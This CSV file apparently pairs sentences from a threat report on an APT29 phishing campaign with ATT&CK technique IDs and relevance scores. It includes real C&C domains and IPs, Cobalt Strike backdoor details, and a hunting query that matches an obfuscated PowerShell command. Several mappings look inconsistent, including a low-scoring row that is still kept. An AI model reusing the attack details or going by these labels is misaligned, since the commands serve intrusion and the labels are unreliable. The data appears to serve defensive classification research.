"query","candidate","type","p_relevant","p_irrelevant","adj_score","margin","keep","decision"
"Meanwhile, numerous alerts in Windows Defender Advanced Threat Protection exposed the attacker techniques across the attack chain.","S0120","S","0.915657","0.084343","0.915657","0.831314","True","keep"
"Third-party security researchers have attributed the attack to a threat actor named APT29 or CozyBear, which largely overlaps with the activity group that Microsoft calls YTTRIUM.","S0674","S","0.953463","0.046537","0.953463","0.906926","True","keep"
"The spear-phishing emails used in this attack resemble file-sharing notifications from OneDrive.","T1071.002","T","0.937079","0.062921","0.937079","0.874158","True","keep"
"Encoded content in the LNK file The encoded payload-another heavily obfuscated PowerShell script-is decoded and executed: Decoded second script The second script carves out two additional resources from within the .LNK file: ds7002.PDF (A decoy PDF) cyzfc.dat (The first stage implant) Command and control The first-stage DLL, cyzfc.dat, is created by the PowerShell script in the path %AppData%\Local\cyzfc.dat.","S1024","S","0.927844","0.072157","0.927844","0.855687","True","keep"
"The second stage is an instance of Cobalt Strike, a commercially available penetration testing tool, which performs the following steps: Define a local named pipe with the format \\.\pipe\MSSE-<number>-server, where <number> is a random number between 0 and 9897 Connecting to the pipe, write it global data with size 0x3FE00 Implement a backdoor over the named pipe: Read from the pipe (maximum 0x3FE00 bytes) to an allocated buffer DeXOR the payload onto a new RW memory region, this time with a much simple XOR key: simple XORing every 4 bytes with 0x7CC2885F Turn the region to be RX Create a thread that starts running the payload' This configuration information is de-XORed at the third payload runtime: The configuration information itself mostly contains C&C information: CobaltStrike is a feature-rich penetration testing tool that provides remote attackers with a wide range of capabilities, including escalating privileges, capturing user input, executing arbitrary commands through PowerShell or WMI, performing reconnaissance, communicating with C&C servers over various protocols, and downloading and installing additional malware.","T0865","T","0.94023","0.05977","0.94023","0.88046","True","keep"
"This configuration information is de-XORed at the third payload runtime: The configuration information itself mostly contains C&C information: CobaltStrike is a feature-rich penetration testing tool that provides remote attackers with a wide range of capabilities, including escalating privileges, capturing user input, executing arbitrary commands through PowerShell or WMI, performing reconnaissance, communicating with C&C servers over various protocols, and downloading and installing additional malware.","T0888","T","0.968883","0.031117","0.968883","0.937766","True","keep"
"If you are not already secured against advanced cyberthreat campaigns via email, begin a free Office 365 E5 trial today.","T1566.001","T","0.883201","0.116799","0.883201","0.766402","True","keep"
"Alerts with the following titles are indicative of this attack activity: Artifacts associated with an advanced threat detected Network activity associated with an advanced threat detected Low-reputation arbitrary code executed by signed executable Suspicious LNK file opened Network protection blocks connections to malicious domains and IP addresses.","T1030","T","0.978579","0.021421","0.978579","0.957158","True","keep"
"2: C&C connection NetworkCommunicationEvents | where EventTime > ago(10d) | where RemoteUrl == ""pandorasong.com"" //Query 3: Malicious PowerShell ProcessCreationEvents | where EventTime > ago(10d) | where ProcessCommandLine contains ""-noni -ep bypass $zk=' JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5rIjtp ZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0""","S0166","S","0.317302","0.682698","0.317302","-0.365396","True","keep"
"URLs hxxps://www.jmj[.]com/personal/nauerthn_state_gov/VFVKRTdRSm C&C servers pandorasong[.]com (95.216.59.92) (first-stage C&C server) Talk to us Questions, concerns, or insights on this story?","S0050","S","0.524716","0.475284","0.524716","0.049432","True","keep"
"A few older samples in Group #3 still use the original MiniDuke loader, while most recent ones are using the updated MiniDuke loader. Meanwhile, the most recent sample in Group #3, which uses the updated loader with t the SHA1 value fecdba1d903a51499a3953b4df1d850fbd5438bd, also connects to another server at IP address 178.21.172.157. rcs.18.jpg rcs.DSC_1365527283.jpg GROUP #3 ?","S0569","S","0.946642","0.053358","0.946642","0.893284","True","keep"
